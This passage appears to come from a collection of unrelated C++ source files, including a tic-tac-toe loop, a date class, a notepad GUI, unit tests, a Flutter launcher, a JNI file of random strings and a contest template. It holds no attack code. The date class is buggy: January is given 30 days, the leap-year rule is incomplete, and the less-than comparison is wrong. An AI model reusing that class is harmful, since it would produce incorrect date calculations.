do\r\n        {\r\n            cin >> p2;\r\n            if (p2.length() == 1 && p2[0] > 48 && p2[0] < 58 && p2[0] != p1[0] && p2[0] != ReptValu[0] &&\r\n                p2[0] != ReptValu[1] && p2[0] != ReptValu[2] && p2[0] != ReptValu[3] && p2[0] != ReptValu[4]\r\n                && p2[0] != ReptValu[5] && p2[0] != ReptValu[6] && p2[0] != ReptValu[7] && p2[0] != ReptValu[8]\r\n                && p2[0] != ReptValu[9])\r\n            {\r\n                cout << endl;\r\n                break;\r\n            }\r\n \r\n            else if (p2[0] == ReptValu[0] || p2[0] == ReptValu[1] || p2[0] == ReptValu[2] || p2[0] == ReptValu[3]\r\n                || p2[0] == ReptValu[4] || p2[0] == ReptValu[5] || p2[0] == ReptValu[6] || p2[0] == ReptValu[7]\r\n                || p2[0] == ReptValu[8] || p2[0] == ReptValu[9])\r\n                 {\r\n                cout << \"\\n * *This position is occupied.Please choose an another position. * *\\n\\n\";\r\n                cout << *P2 << \" turn again : \";\r\n                 }\r\n            else\r\n            {\r\n                cout << \"\\nInvalid input.\\nPlease enter a natural number from the range 1 to 9.\\n\\n\";\r\n                cout << *P2 << \" turn again : \";\r\n            }\r\n        } while (true);\r\n \r\n        // Storing Player 2 Input in Matrix\r\n \r\n        if (p2[0] == '1') { Ttt[0][0] = 'O'; }\r\n",
    "\ufeff#include \"date class.h\"\n\ndate::date(int year = 0, int month = 1, int day = 1)\n{\n\tif (!(year >= 0 && month > 0 && month <= 12 && day <= GetMonthDay(year, month)))\n\t{\n\t\tstd::cout << \"\u65e5\u671f\u4e0d\u5408\u6cd5\u5df2\u7ecf\u66ff\u6362\u6210\u9ed8\u8ba4\u65e5\u671f\" << std::endl;\n\t\tyear = 0;\n\t\tmonth = 1;\n\t\tday = 1;\n\t}\n\t_year = year;\n\t_month = month;\n\t_day = day;\n}\n\ndate::date(const date& d)\n{\n\t_year = d._year;\n\t_month = d._month;\n\t_day = d._day;\n}\n\nint date:: GetMonthDay(const int year, const int month)\n{\n\tint PreMonthDay[13] = { 0,30,28,31,30,31,30,31,31,30,31,30,31 };\n\tif (year % 100 != 0 && year % 4 == 0 && month == 2)\n\t{\n\t\treturn 29;\n\t}\n\treturn PreMonthDay[month];\n}\n\nint date::GetDay(int year, int month,int day)\n{\n\tint yearday = 0;\n\tint monthday = 0;\n\tint totalday = 0;\n\n\tfor (month -= 1; month >= 1; month--)\n\t{\n\t\tmonthday = monthday + GetMonthDay(year, month);\n\t}\n\tfor (year -= 1; year >= 0; year--)\n\t{\n\t\tif (year % 100 != 0 && year % 4 == 0)\n\t\t{\n\t\t\tyearday = yearday + 366;\n\t\t\tcontinue;\n\t\t}\n\t\tyearday = yearday + 365;\n\t\tcontinue;\n\t}\n\ttotalday = yearday + monthday + day;\n\treturn totalday;\n}\n\nvoid date::print()const\n{\n\tstd::cout << _year << \"-\" << _month << \"-\" << _day << std::endl;\n}\n\nbool date::operator==(const date& d)const\n{\n\tif (this->_year == d._year && this->_month == d._month && this->_day == d._day)\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nbool date::operator<(const date& d)const\n{\n\tif (_year < d._year)\n\t{\n\t\treturn true;\n\t}\n\telse if (_month < d._month)\n\t{\n\t\treturn true;\n\t}\n\telse if (_day < d._day)\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\nbool date::operator<=(const date& d)const\n{\n\treturn *this < d || *this == d;\n}\n\nbool date::operator>(const date& d)const\n{\n\treturn!(*this < d || *this == d);\n}\n\nbool date::operator>=(const date& d)const\n{\n\treturn *this > d || *this == d;\n}\n\ndate& date::operator=(const date d)\n{\n\t_year = d._year;\n\t_month = d._month;\n\t_day = d._day;\n\treturn *this;\n}\n\ndate date::operator+(int day)//\u65e5\u671f+\u5929\u6570\n{\n\tif (day < 0)\n\t{\n\t\treturn *this - (-day);\n\t}\n\tdate ret(*this);\n\tret._day = ret._day + day;\n\twhile (ret._day > GetMonthDay(ret._year, ret._month))\n\t{\n\t\tret._day = ret._day - GetMonthDay(ret._year, ret._month);\n\t\tret._month++;\n\t\tif (ret._month > 12)\n\t\t{\n\t\t\tret._year++;\n\t\t\tret._month = 1;\n\t\t}\n\t}\n\treturn ret;\n}\n\ndate date::operator-(int day)//\u65e5\u671f-\u5929\u6570\n{\n\tif (day < 0)\n\t{\n\t\treturn *this + (-day);\n\t}\n\tdate ret(*this);\n\tret._day = ret._day - day;\n\twhile (ret._day <= 0)\n\t{\n\t\tret._month--;\n\t\tif (ret._month <= 0)\n\t\t{\n\t\t\tret._year--;\n\t\t\tret._month = 12;\n\t\t}\n\t\tret._day = ret._day + GetMonthDay(ret._year, ret._month);\n\t}\n\treturn ret;\n}\n\ndate& date::operator+=(int day)\n{\n\t*this = *this + day;\n\treturn *this;\n}\n\ndate& date::operator-=(int day)\n{\n\t*this = *this - day;\n\treturn *this;\n}\n\nint date::operator-(const date& d)//\u65e5\u671f-\u65e5\u671f \u8f93\u51fa\u5929\u6570\n{\n\tint day1 = GetDay(_year, _month, _day);\n\tint day2 = GetDay(d._year, d._month, d._day);\n\treturn day1 - day2;\n}\ndate& date::operator--()//\u524d\u7f6e\u51cf\u51cf\n{\n\t*this -= 1;\n\treturn *this;\n}\n\ndate date::operator--(int)//\u540e\u7f6e\u51cf\u51cf\n{\n\tdate tmp(*this);\n\t*this -= 1;\n\treturn tmp;\n}\n\ndate& date::operator++()//\u524d\u7f6e++\n{\n\t*this += 1;\n\treturn *this;\n}\n\ndate date::operator++(int)//\u540e\u7f6e++\n{\n\tdate tmp(*this);\n\t*this += 1;\n\treturn tmp;\n}",
    "#include \"NottyPad_GUI.h\"\n\nusing namespace System::Windows::Forms;\nusing namespace System::Diagnostics;\nusing namespace System::IO;\n\nSystem::Windows::Forms::DialogResult saveChanges;\nSystem::Windows::Forms::DialogResult dialogResult;\n\n//Custom Functions\nSystem::Void NottyPad::NottyPad_GUI::saveAndClose(TextBox^ textBox, SaveFileDialog^ saveFileDialog) {\n\tsaveChanges = MessageBox::Show(\"Are you want to save this changes?\", \"Warning\", MessageBoxButtons::YesNo);\n\tif (saveChanges == System::Windows::Forms::DialogResult::Yes) {\n\t\tdialogResult = saveFileDialog->ShowDialog();\n\t\tif (dialogResult == System::Windows::Forms::DialogResult::OK) {\n\t\t\tsaveFile(textBox, saveFileDialog);\n\t\t}\n\t}\n}\n\nSystem::Void NottyPad::NottyPad_GUI::checkForNewFile(TextBox^ textBox, SaveFileDialog^ saveFileDialog) {\n\n\tsaveChanges = MessageBox::Show(\"Are you want to save this changes?\", \"Warning\", MessageBoxButtons::YesNo);\n\tif (saveChanges == System::Windows::Forms::DialogResult::Yes) {\n\t\tdialogResult = saveFileDialog->ShowDialog();\n\t\tif (dialogResult == System::Windows::Forms::DialogResult::OK) {\n\t\t\tStreamWriter^ sw = gcnew StreamWriter(saveFileDialog->FileName);\n\t\t\tsw->Write(textBox->Text);\n\t\t\tsw->Close();\n\t\t\tNottyPad_GUI::Text = Path::GetFileName(saveFileDialog->FileName) + \" - NottyPad\";\n\t\t\tfileEdited = false;\n\t\t}\n\t}\n\telse {\n\t\ttextBox->Clear();\n\t\tNottyPad_GUI::Text = \"Unnamed - NottyPad\";\n\t\tfileEdited = false;\n\t}\n}\n\nSystem::Void NottyPad::NottyPad_GUI::checkForOpenFile(TextBox^ textBox, SaveFileDialog^ saveFileDialog) {\n\n\tsaveChanges = MessageBox::Show(\"Are you want to save this changes?\", \"Warning\", MessageBoxButtons::YesNo);\n\tif (saveChanges == System::Windows::Forms::DialogResult::Yes) {\n\t\tdialogResult = saveFileDialog->ShowDialog();\n\t\tif (dialogResult == System::Windows::Forms::DialogResult::OK) {\n\t\t\tStreamWriter^ sw = gcnew StreamWriter(saveFileDialog->FileName);\n\t\t\tsw->Write(textBox->Text);\n\t\t\tsw->Close();\n\t\t\tNottyPad_GUI::Text = Path::GetFileName(saveFileDialog->FileName) + \" - NottyPad\";\n\t\t\tfileEdited = false;\n\t\t}\n\t}\n\telse {\n\t\topenFile(textBox, openFileDialog);\n\t}\n}\n\nSystem::Void NottyPad::NottyPad_GUI::saveFile(TextBox^ textBox, SaveFileDialog^ saveFileDialog) {\n\tdialogResult = saveFileDialog->ShowDialog();\n\tif (dialogResult == System::Windows::Forms::DialogResult::OK) {\n\t\tStreamWriter^ sw = gcnew StreamWriter(saveFileDialog->FileName);\n\t\tsw->Write(textBox->Text);\n\t\tsw->Close();\n\t\tNottyPad_GUI::Text = Path::GetFileName(saveFileDialog->FileName) + \" - NottyPad\";\n\t\tfileEdited = false;\n\t}\n}\n\nSystem::Void NottyPad::NottyPad_GUI::openFile(TextBox^ textBox, OpenFileDialog^ openFileDialog) {\n\n\tdialogResult = openFileDialog->ShowDialog();\n\tif (dialogResult == System::Windows::Forms::DialogResult::OK) {\n\t\tStreamReader^ sr = gcnew StreamReader(openFileDialog->FileName);\n\t\tString^ fileTextString = sr->ReadToEnd();\n\t\ttextBox->Text = fileTextString;\n\t\tNottyPad_GUI::Text = Path::GetFileName(openFileDialog->FileName) + \" - NottyPad\";\n\t\tfileEdited = false;\n\t}\n\n}\n\n\n//Tool Strip Menu Events\nSystem::Void NottyPad::NottyPad_GUI::newToolStripMenuItem_Click(System::Object^ sender, System::EventArgs^ e) {\n\tif (!fileEdited) {\n\t\ttextBox_Note->Clear();\n\t\tNottyPad_GUI::Text = \"Unnamed - NottyPad\";\n\t}\n\telse {\n\t\tcheckForNewFile(textBox_Note, saveFileDialog);\n\t}\n}\n\nSystem::Void NottyPad::NottyPad_GUI::openToolStripMenuItem_Click(System::Object^ sender, System::EventArgs^ e) {\n\tif (!fileEdited) {\n\t\topenFile(textBox_Note, openFileDialog);\n\t}\n\telse {\n\t\tcheckForOpenFile(textBox_Note, saveFileDialog);\n\t}\n}\n\nSystem::Void NottyPad::NottyPad_GUI::exitToolStripMenuItem_Click(System::Object^ sender, System::EventArgs^ e) {\n\tif (fileEdited) {\n\t\tsaveAndClose(textBox_Note, saveFileDialog);\n\t}\n\tApplication::Exit();\n}\n\nSystem::Void NottyPad::NottyPad_GUI::aboutToolStripMenuItem_Click(System::Object^ sender, System::EventArgs^ e) {\n\tpanel_About->Show();\n}\n\nSystem::Void NottyPad::NottyPad_GUI::saveToolStripMenuItem_Click(System::Object^ sender, System::EventArgs^ e) {\n\n}\n\nSystem::Void NottyPad::NottyPad_GUI::saveAsToolStripMenuItem_Click(System::Object^ sender, System::EventArgs^ e) {\n\tsaveFile(textBox_Note, saveFileDialog);\n}\n\n//About Panel Events\nSystem::Void NottyPad::NottyPad_GUI::label_Close_Panel_Click(System::Object^ sender, System::EventArgs^ e) {\n\tpanel_About->Hide();\n}\n\nSystem::Void NottyPad::NottyPad_GUI::panel_About_Click(System::Object^ sender, System::EventArgs^ e) {\n\tString^ githubURL = \"https://github.com/mickiemouse\";\n\tProcess::Start(githubURL);\n}\n\n\n//Other Tools\nSystem::Void NottyPad::NottyPad_GUI::textBox_Note_TextChanged(System::Object^ sender, System::EventArgs^ e) {\n\tfileEdited = true;\n}\n\nSystem::Void NottyPad::NottyPad_GUI::NottyPad_GUI_FormClosing(System::Object^ sender, System::Windows::Forms::FormClosingEventArgs^ e) {\n\tif (fileEdited) {\n\t\tsaveAndClose(textBox_Note, saveFileDialog);\n\t}\n}",
    "#include \"pch.h\"\n#include \"../Project1/baseball.cpp\"\n\n\nclass BaseballFixture : public testing::Test\n{\npublic:\n    Baseball game{\"123\"};\n\n    void assrtIllegalArgument(string guessNumber)\n    {\n        try\n        {\n            game.guess(guessNumber);\n            FAIL();\n        }\n        catch (exception e)\n        {\n            // PASS\n        }\n    }\n};\n\nTEST_F(BaseballFixture, ThrowExceptionWhenInvalidCase)\n{\n    assrtIllegalArgument(\"12\");\n    assrtIllegalArgument(\"12s\");\n    assrtIllegalArgument(\"121\");\n}\n\nTEST_F(BaseballFixture, ReturnSolvedResultIfMatchedNumber)\n{\n    GuessResult result = game.guess(\"123\");\n\n    EXPECT_TRUE(result.solved);\n    EXPECT_EQ(3, result.strikes);\n    EXPECT_EQ(0, result.balls);\n}\n\nTEST_F(BaseballFixture, ReturnSolvedResultIfMatchedNumber2)\n{\n    GuessResult result = game.guess(\"023\");\n\n    EXPECT_FALSE(result.solved);\n    EXPECT_EQ(2, result.strikes);\n    EXPECT_EQ(0, result.balls);\n}\n\nTEST_F(BaseballFixture, ReturnSolvedResultIfMatchedNumber3)\n{\n    GuessResult result = game.guess(\"321\");\n\n    EXPECT_FALSE(result.solved);\n    EXPECT_EQ(1, result.strikes);\n    EXPECT_EQ(2, result.balls);\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_4\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <jni.h>\n#include <string>\n\nstd::string str0 =\"DG3MH417I0QYZOF7\";\nstd::string str1 =\"WZ67LXHFOK710Q06\";\nstd::string str2 =\"0KCRDBIRQF2IKEKW\";\nstd::string str3 =\"WAPKDRMTCS5M87G2\";\nstd::string str4 =\"2OV8UAVE4SJHITIU\";\nstd::string str5 =\"OO1C6GR2DKGYLT8V\";\nstd::string str6 =\"O02BG8323PENBI8S\";\nstd::string str7 =\"I9BR7SQJ3Y1FEH6S\";\nstd::string str8 =\"HWB3B6XQFJVBE9WC\";\nstd::string str9 =\"76RMV2G0VGZRKN1O\";\nstd::string str10 =\"WX5H40BVC2B1M2TT\";\nstd::string str11 =\"H4NOMQC6OKT50YJY\";\nstd::string str12 =\"M5EKJYXP3114A547\";\nstd::string str13 =\"LVGY0N0BM1E8SHTJ\";\nstd::string str14 =\"9M4SRP5SNW8UTZMH\";\nstd::string str15 =\"LWYONFABB0H7PWZ9\";\nstd::string str16 =\"8BORA7IRF6MDC7BG\";\nstd::string str17 =\"ZUPE66P8JOUUOPQ8\";\nstd::string str18 =\"HPUCWGEUFJCOKCUI\";\nstd::string str19 =\"S3OFXN93A7D0D1CU\";\nstd::string str20 =\"AR5JZO0VLNDGD611\";\nstd::string str21 =\"M5EKJYXP3114A547\";\nstd::string str22 =\"ZE7M32OZMAGR11W4\";\nstd::string str23 =\"WU2LRU6NZCQ7Q9FW\";\nstd::string str24 =\"0KEHXMX41CQMZ6T9\";\nstd::string str25 =\"BKSEOIMURZJWDRBQ\";\nstd::string str26 =\"ATFXNIXOT0HBCEQT\";\nstd::string str27 =\"MV7U08HHJNNABULF\";\nstd::string str28 =\"CTECPV6AI64KGV3O\";\nstd::string str29 =\"EQE9T3CULRQT82AQ\";\nstd::string str30 =\"TMXTCDONMAWXSAO4\";\nstd::string str31 =\"2WIQCD5TDH7OQSQ1\";\nstd::string str32 =\"OHWR3PQEYK7A6GSA\";\nstd::string str33 =\"MEJSF3FQ3OBH6FIM\";\nstd::string str34 =\"Y5I5KOPTKFXS3H2F\";\nstd::string str35 =\"5FB1MN72SRBYFU6I\";\nstd::string str36 =\"SVVOJL9FO0B7ZC4J\";\nstd::string str37 =\"WLQXHHMUPO30N8WX\";\nstd::string str38 =\"8AF2K56G8FP82CMO\";\nstd::string str39 =\"O2YY9SPJ6DF0TXSW\";\nstd::string str40 =\"HTPWZ8JC4BO22WT6\";\nstd::string str41 =\"GSFI7DZJ3KH7ODO7\";\nstd::string str42 =\"86QZQ3NVD35HLQSM\";\nstd::string str43 =\"R2IJBDIPO3MM4W0Z\";\nstd::string str44 =\"SU8W2Y4HOLRXTCH3\";\nstd::string str45 =\"33CQ79B32M8Z99V3\";\nstd::string str46 =\"EQWFBZQDGWPJISWZ\";\nstd::string str47 =\"8E3LBA2ZAPTOYE7N\";\nstd::string str48 =\"ACNMW8U29GE07H4R\";\nstd::string str49 =\"O6KKNIY6XN7BXSQ1\";\nstd::string str50 =\"LSN0R6OG5QTNJCKD\";\nstd::string str51 =\"DQRM739M1FTLSIFA\";\nstd::string str52 =\"NI1VOGFR01IECXFS\";\nstd::string str53 =\"T0S4BNX04KZKR90J\";\nstd::string str54 =\"4LHRIHKXL9TV097I\";\nstd::string str55 =\"CSDL8KLFO08CTGM5\";\nstd::string str56 =\"YVXBXI8NGYAKSM25\";\nstd::string str57 =\"X7XH8UTW4OTE8DAB\";\nstd::string str58 =\"GLTH0B8FJIMNH2ZJ\";\nstd::string str59 =\"91AL6MEOSXTBLWFX\";\nstd::string str60 =\"U5YBPQHZWQ4Z65CB\";\nstd::string str61 =\"63LST7C4E18LA024\";\nstd::string str62 =\"5CAB2EIAMFQVR0QM\";\nstd::string str63 =\"PZCW29FDKPRP3G4U\";\nstd::string str64 =\"H9PSNXM1HA28ELGE\";\nstd::string str65 =\"S4PM1RD94OGSZ456\";\nstd::string str66 =\"CRPRBG06IHACTG12\";\nstd::string str67 =\"9SI6D58Z0CAH2VTH\";\nstd::string str68 =\"9ZG52FAAUNVZB6X8\";\nstd::string str69 =\"W1WL9B2QF3XHTCD0\";\nstd::string str70 =\"1IH828V8UO1VOZ99\";\nstd::string str71 =\"BERPGKJ0U7ZG4OJP\";\nstd::string str72 =\"O22QX388K99TIO43\";\nstd::string str73 =\"59EXT2YB58SS8RB1\";\nstd::string str74 =\"Q9NLG8GMG77279JR\";\nstd::string str75 =\"123HEKWLFE25Z8RB\";\nstd::string str76 =\"KM3MLS8SOQHWNFT7\";\nstd::string str77 =\"0IC445K91FPBUR10\";\nstd::string str78 =\"LX6QRR81FC3M0AI6\";\nstd::string str79 =\"0SEDXEC3T36CKUKS\";\nstd::string str80 =\"ZWW3YCGO0VBGRM4K\";\nstd::string str81 =\"MEC2BEKDL6W0XAGC\";\nstd::string str82 =\"I5J490WBJP6R3L22\";\nstd::string str83 =\"T3L3E9MHIRZ0769Z\";\nstd::string str84 =\"7FMN21HJLILM6HGT\";\nstd::string str85 =\"DMT6EAD7KWPZ74S2\";\nstd::string str86 =\"PE3X9ZGLM4TFDXAU\";\nstd::string str87 =\"M86DUSQ2GZVEZCNT\";\nstd::string str88 =\"29XX5GVDLOLUDPC6\";\nstd::string str89 =\"191NMEPEJP3FTCXI\";\nstd::string str90 =\"V17R1NJ3OY08IMO1\";\nstd::string str91 =\"D7YJ8SXT411K5PSK\";\nstd::string str92 =\"KRHN8R1XB8GFMLQF\";\nstd::string str93 =\"D56BTVTVRR5Y96UD\";\nstd::string str94 =\"P09PP030YD6EH7Z2\";\nstd::string str95 =\"CWDTSQCF5G2I0J1C\";\nstd::string str96 =\"VZFC0A2ZE1M7HP02\";\nstd::string str97 =\"7ZEE8DKQNO67WP5J\";\nstd::string str98 =\"QMS8L2RF3VX7SUG4\";\nstd::string str99 =\"NG74CH2QI5LWPZK2\";\nstd::string str100 =\"GD7XSJIQZIYQSVDJ\";\nstd::string str101 =\"QU37U0Q5PPX326VD\";\nstd::string str102 =\"2DN2DTY394LQ7ISS\";\nstd::string str103 =\"3M6VZDVBB8AYK8UN\";\nstd::string str104 =\"0H7WJU1FWIJOBR8R\";\nstd::string str105 =\"OY42CG7ORC3PG3EK\";\nstd::string str106 =\"Q82IW6J4BBF8JOW6\";\nstd::string str107 =\"1G40CBXZ7JVZBUUB\";\nstd::string str108 =\"J00X0VZODUREGMU0\";\nstd::string str109 =\"9PJXRAKNE3WRKMBK\";\nstd::string str110 =\"JMMJSFDNI1725ZSK\";\nstd::string str111 =\"PL22YOAOZAM8RR78\";\nstd::string str112 =\"UWL1QJSTCPCIYSVD\";\nstd::string str113 =\"SPCL8JVHR5S7WAWX\";\nstd::string str114 =\"T3KOD0RPCUCIT2R8\";\nstd::string str115 =\"QG8Z3RSYT2MKDNFI\";\nstd::string str116 =\"QF2KQEL884A88D8P\";\nstd::string str117 =\"1JYTVRO5VG22AG9S\";\nstd::string str118 =\"6ZIA9HR7NW3SJXKY\";\nstd::string str119 =\"WT1TXP72Y8LUEWU2\";\nstd::string str120 =\"U1T78PRTNA7AVXPV\";\nstd::string str121 =\"TXAPSULIIJVREIFA\";\nstd::string str122 =\"J145DPDYJIY5Q1Q1\";\nstd::string str123 =\"LF2PCL9ZOE3SKN5Y\";\nstd::string str124 =\"WZ6HZ7VWAHBP6YBD\";\nstd::string str125 =\"MEHVA2DAM4Y771H5\";\nstd::string str126 =\"PGCIO80NKHM2F",
    "#include<bits/stdc++.h>\n#include<cassert>\n//#include<ext/pb_ds/assoc_container.hpp>\n//#include<ext/pb_ds/tree_policy.hpp>\n//#include<ext/pb_ds/tag_and_trait.hpp>\n#define overload4(_1, _2, _3, _4, name, ...) name\n#define rep1(i, n) for (ll i = 0; i < ll(n); ++i)\n#define rep2(i, s, n) for (ll i = ll(s); i < ll(n); ++i)\n#define rep3(i, s, n, d) for(ll i = ll(s); i < ll(n); i+=d)\n#define rep(...) overload4(__VA_ARGS__,rep3,rep2,rep1)(__VA_ARGS__)\n#define rrep1(i, n) for (ll i = ll(n)-1; i >= 0; i--)\n#define rrep2(i, n, t) for (ll i = ll(n)-1; i >= (ll)t; i--)\n#define rrep3(i, n, t, d) for (ll i = ll(n)-1; i >= (ll)t; i-=d)\n#define rrep(...) overload4(__VA_ARGS__,rrep3,rrep2,rrep1)(__VA_ARGS__)\n#define all(a) a.begin(),a.end()\n#define rall(a) a.rbegin(),a.rend()\n#define SUM(a) accumulate(all(a),0LL)\n#define MIN(a) *min_element(all(a))\n#define MAX(a) *max_element(all(a))\n#define SORT(a) sort(all(a));\n#define REV(a) reverse(all(a));\n#define SZ(a) int(a.size())\n#define popcount(x) __builtin_popcountll(x)\n#define pf push_front\n#define pb push_back\n#define ef emplace_front\n#define eb emplace_back\n#define ppf pop_front\n#define ppb pop_back\n#ifdef __LOCAL\n#define debug(...) { cout << #__VA_ARGS__; cout << \": \"; print(__VA_ARGS__); cout << flush; }\n#else\n#define debug(...) void(0);\n#endif\n#define INT(...) int __VA_ARGS__;scan(__VA_ARGS__)\n#define LL(...) ll __VA_ARGS__;scan(__VA_ARGS__)\n#define STR(...) string __VA_ARGS__;scan(__VA_ARGS__)\n#define CHR(...) char __VA_ARGS__;scan(__VA_ARGS__)\n#define DBL(...) double __VA_ARGS__;scan(__VA_ARGS__)\n#define LD(...) ld __VA_ARGS__;scan(__VA_ARGS__)\nusing namespace std;\n//using namespace __gnu_pbds;\nusing ll = long long;\nusing ld = long double;\nusing P = pair<int, int>;\nusing LP = pair<ll, ll>;\nusing vi = vector<int>;\nusing vvi = vector<vi>;\nusing vvvi = vector<vvi>;\nusing vl = vector<ll>;\nusing vvl = vector<vl>;\nusing vvvl = vector<vvl>;\nusing vd = vector<double>;\nusing vvd = vector<vd>;\nusing vs = vector<string>;\nusing vc = vector<char>;\nusing vvc = vector<vc>;\nusing vb = vector<bool>;\nusing vvb = vector<vb>;\nusing vp = vector<P>;\nusing vvp = vector<vp>;\n\n//template<class T>\n//using PQ = priority_queue <pair<T, int>, vector<pair < T, int>>, greater <pair<T, int>>>;\n\ntemplate<class T>\nusing PQ = priority_queue <T, vector<T>, greater <T>>;\n\ntemplate<class S, class T>\nistream &operator>>(istream &is, pair <S, T> &p) { return is >> p.first >> p.second; }\n\ntemplate<class S, class T>\nostream &operator<<(ostream &os, const pair <S, T> &p) { return os << '{' << p.first << \", \" << p.second << '}'; }\n\ntemplate<class S, class T, class U>\nistream &operator>>(istream &is, tuple <S, T, U> &t) { return is >> get<0>(t) >> get<1>(t) >> get<2>(t); }\n\ntemplate<class S, class T, class U>\nostream &operator<<(ostream &os, const tuple <S, T, U> &t) {\n    return os << '{' << get<0>(t) << \", \" << get<1>(t) << \", \" << get<2>(t) << '}';\n}\n\ntemplate<class T>\nistream &operator>>(istream &is, vector <T> &v) {\n    for (T &t: v) { is >> t; }\n    return is;\n}\n\ntemplate<class T>\nostream &operator<<(ostream &os, const vector <T> &v) {\n    os << '[';\n    rep(i, v.size()) os << v[i] << (i == int(v.size() - 1) ? \"\" : \", \");\n    return os << ']';\n}\n\ntemplate<class T>\nostream &operator<<(ostream &os, const deque <T> &v) {\n    os << '[';\n    rep(i, v.size()) os << v[i] << (i == int(v.size() - 1) ? \"\" : \", \");\n    return os << ']';\n}\n\ntemplate<class T>\nostream &operator<<(ostream &os, const set <T> &st) {\n    os << '{';\n    auto it = st.begin();\n    while (it != st.end()) {\n        os << (it == st.begin() ? \"\" : \", \") << *it;\n        it++;\n    }\n    return os << '}';\n}\n\ntemplate<class T>\nostream &operator<<(ostream &os, const multiset <T> &st) {\n    os << '{';\n    auto it = st.begin();\n    while (it != st.end()) {\n        os << (it == st.begin() ? \"\" : \", \") << *it;\n        it++;\n    }\n    return os << '}';\n}\n\ntemplate<class T>\nvoid vecout(const vector <T> &v, char div = '\\n') {\n    rep(i, v.size()) cout << v[i] << (i == int(v.size() - 1) ? '\\n' : div);\n}\n\ntemplate<class T>\nbool chmin(T &a, T b) {\n    if (a > b) {\n        a = b;\n        return true;\n    }\n    return false;\n}\n\ntemplate<class T>\nbool chmax(T &a, T b) {\n    if (a < b) {\n        a = b;\n        return true;\n    }\n    return false;\n}\n\nvoid scan() {}\n\ntemplate<class Head, class... Tail>\nvoid scan(Head &head, Tail &... tail) {\n    cin >> head;\n    scan(tail...);\n}\n\ntemplate<class T>\nvoid print(const T &t) { cout << t << '\\n'; }\n\ntemplate<class Head, class... Tail>\nvoid print(const Head &head, const Tail &... tail) {\n    cout << head << ' ';\n    print(tail...);\n}\n\ntemplate<class... T>\nvoid fin(const T &... a) {\n    print(a...);\n    exit(0);\n}\n\ntemplate<class T>\nvector <T> &operator+=(vector <T> &v, T x) {\n    for (T &t: v) t += x;\n    return v;\n}\n\ntemplate<class T>\nvector <T> &operator-=(vector <T> &v, T x) {\n    for (T &t: v) t -= x;\n    return v;\n}\n\ntemplate<class T>\nvector <T> &operator*=(vector <T> &v, T x) {\n    for (T &t: v) t *= x;\n    return v;\n}\n\ntem",
    "//#include <iostream>\n//#include <vector>\n//\n//using namespace std;\n//\n//vector<vector<int>> node(1001);\n//vector<int> color(1001);\n//vector<int> visit(1001);\n//\n//bool DFS(int here, int color_1) {\n//    // \ubc29\ubb38\ucc98\ub9ac, \uc0c9 \uce60\ud558\uae30\n//    visit[here] = 1;\n//    color[here] = color_1;\n//\n//    // \uac08 \uc218 \uc788\ub294 \ub178\ub4dc \ubaa8\ub450 \ubc29\ubb38\n//    for (int i : node[here]) {\n//        // \ubc29\ubb38\ud558\uc9c0 \uc54a\uc558\uc744 \ub54c\n//        if (!visit[i]) {\n//            // \ub2e4\uc74c \ub178\ub4dc \ubc29\ubb38 -> \uacb9\uce58\ub294 \uac8c \ub098\uc62c \ub54c\n//            if (!DFS(i, -color_1)) {\n//                return false;\n//            }\n//        }\n//        // (-1 -1), (1 1)\uc774 \ub098\uc62c \ub54c\n//        else if (color[i] == color[here]) {\n//            return false;\n//        }\n//    }\n//    // \ubaa8\ub450 \ub9cc\uc871\ud560 \ub54c\n//    return true;\n//}\n//\n//int main() {\n//    int T;\n//    cin >> T;\n//\n//    while (T--) {\n//        int N, M;\n//        cin >> N >> M;\n//\n//        for (int i = 0; i < N + 1; ++i) {\n//            node[i].clear();\n//            visit[i] = 0;\n//            color[i] = 0;\n//        }\n//\n//        for (int i = 0; i < M; ++i) {\n//            int x, y;\n//            cin >> x >> y;\n//            node[x].push_back(y);\n//            node[y].push_back(x); // \uc591\ubc29\ud5a5 \uadf8\ub798\ud504\uc774\ubbc0\ub85c \ubc18\ub300 \ubc29\ud5a5\ub3c4 \ucd94\uac00\n//        }\n//\n//        bool isPossible = true;\n//        for (int i = 1; i <= N; ++i) {\n//            // \ubaa8\ub4e0 \uc815\uc810\uc5d0\uc11c \ud55c \ubc88\uc529 \ub3cc\uae30\n//            if (!visit[i]) {\n//                if (!DFS(i, 1)) {\n//                    isPossible = false;\n//                    break;\n//                }\n//            }\n//        }\n//\n//        if (isPossible) {\n//            cout << \"possible\\n\";\n//        }\n//        else {\n//            cout << \"impossible\\n\";\n//        }\n//    }\n//    return 0;\n//}\n",
